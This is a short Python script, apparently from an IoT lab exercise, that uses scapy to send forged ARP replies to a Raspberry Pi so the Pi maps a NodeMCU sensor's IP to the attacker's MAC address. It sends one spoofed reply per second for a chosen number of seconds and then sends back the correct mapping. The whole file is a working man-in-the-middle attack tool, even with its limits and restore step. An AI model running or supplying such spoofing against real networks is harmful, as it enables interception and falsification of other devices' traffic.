"""ARP spoofing (man in the middle) against the Pi ONLY: tell the Pi "this sensor's IP is at MY MAC".

Sends 1 fake ARP reply per second, unicast to the Pi only (nobody else on the network receives it),
then sends the correct address back. Your laptop's real MAC is in these packets.
Run PowerShell as Administrator (Npcap).

python arp_spoof.py 172.29.1.135 172.29.2.58                  (Pi, NodeMCU; 10 s)
python arp_spoof.py 172.29.1.135 172.29.2.58 --seconds 20
"""
import argparse
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp

p = argparse.ArgumentParser(description="ARP spoofing against the Pi only")
p.add_argument("pi", help="IP of the Pi (gateway)")
p.add_argument("victim", help="IP of the NodeMCU we pretend to be")
p.add_argument("--seconds", type=int, default=10)
a = p.parse_args()

pi_mac, victim_mac = getmacbyip(a.pi), getmacbyip(a.victim)
if not pi_mac or not victim_mac:
    raise SystemExit("cannot find the MAC of the Pi or of the victim (are they on the same network?)")
my_mac = get_if_hwaddr(conf.iface)
print(f"telling the Pi {a.pi} that {a.victim} is at {my_mac} (real: {victim_mac}) for {a.seconds} s")

fake = Ether(dst=pi_mac) / ARP(op=2, psrc=a.victim, hwsrc=my_mac, pdst=a.pi, hwdst=pi_mac)
for _ in range(a.seconds):
    sendp(fake, verbose=False)
    time.sleep(1)

correct = Ether(dst=pi_mac) / ARP(op=2, psrc=a.victim, hwsrc=victim_mac, pdst=a.pi, hwdst=pi_mac)
sendp(correct, count=3, verbose=False)
print("done: correct address sent back to the Pi")
